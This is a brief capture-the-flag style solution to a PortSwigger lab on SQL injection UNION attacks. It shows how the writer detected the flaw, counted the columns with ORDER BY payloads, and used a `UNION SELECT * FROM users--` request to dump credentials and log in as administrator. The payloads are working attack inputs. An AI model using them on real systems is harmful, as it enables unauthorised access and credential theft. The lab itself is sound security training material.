# [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

## Lab

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Solutions

1. Detect SQLi:

    - `GET /filter?category=' HTTP/1.1`

    ```http
    HTTP/1.1 500 Internal Server Error
    ```

2. Determining the number of columns using `ORDER BY`:
    - positions: `GET /filter?category='+ORDER+BY+ยง1ยง-- HTTP/1.1`
    - payloads: 1 -> 10
    - result: 2 columns
3. Exploit:

    ```http
    GET /filter?category='UNION+SELECT+*+FROM+users-- HTTP/1.1
    ```

4. Login to admin account => Lab Solved
